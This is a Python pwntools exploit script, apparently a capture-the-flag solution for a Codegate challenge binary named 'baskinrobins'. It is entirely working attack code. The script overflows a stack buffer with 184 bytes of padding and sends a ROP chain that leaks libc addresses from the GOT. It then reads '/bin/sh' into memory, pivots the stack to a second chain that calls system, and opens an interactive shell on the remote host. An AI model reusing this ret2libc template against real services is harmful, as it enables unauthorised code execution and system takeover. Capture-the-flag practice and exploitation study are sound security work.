from pwn import *

#t = process('./baskinrobins')
t = remote('ch41l3ng3s.codegate.kr', 3131)
img = ELF('./baskinrobins')

pop_rdi = 0x400bc3
pop_rsi_rdx = 0x40087b
system_off = 0x24c50
binsh = 0x6020d0
chain2 = 0x602dcc
	
rop = ""

# Leak read address from GOT
rop += p64(pop_rdi)
rop += p64(img.got["read"])
rop += p64(img.plt["puts"])

# Leak __libc_start_main address from GOT
rop += p64(pop_rdi)
rop += p64(img.got["__libc_start_main"])
rop += p64(img.plt["puts"])

# Read /bin/sh into bss
rop += p64(pop_rdi)
rop += p64(0x0)
rop += p64(pop_rsi_rdx)
rop += p64(binsh)
rop += p64(0x100)
rop += p64(img.plt["read"])

# Read ROP chain into bss
rop += p64(pop_rdi)
rop += p64(0x0)
rop += p64(pop_rsi_rdx)
rop += p64(chain2)
rop += p64(0x100)
rop += p64(img.plt["read"])

# Move rsp to new chain
rop += p64(0x400bbd)	# pop rsp; pop r13; pop 14; pop r15
rop += p64(chain2)

log.info("Sending leak and read chain - {} bytes".format(len(rop) + 184))
t.sendline('A'* 184 + rop)

t.recvuntil("Don't break the rules...:( \n")

read = u64(t.recvline(False).ljust(8, '\x00'))
libcsm = u64(t.recvline(False).ljust(8, '\x00'))

system = libcsm + system_off

log.info("read: 0x{:08x}".format(read))
log.info("__libc_start_main: 0x{:08x}".format(libcsm))
log.info("system: 0x{:08x}".format(system))

log.info("Sending /bin/sh")
t.send('/bin/sh')

rop = ""
rop += p64(0xdeaddeaddeaddead)
rop += p64(0xdeaddeaddeaddead)
rop += p64(0xdeaddeaddeaddead)
rop += p64(pop_rdi)
rop += p64(binsh)
rop += p64(system)

log.info("Sending second stage chain")
t.send(rop)

t.interactive()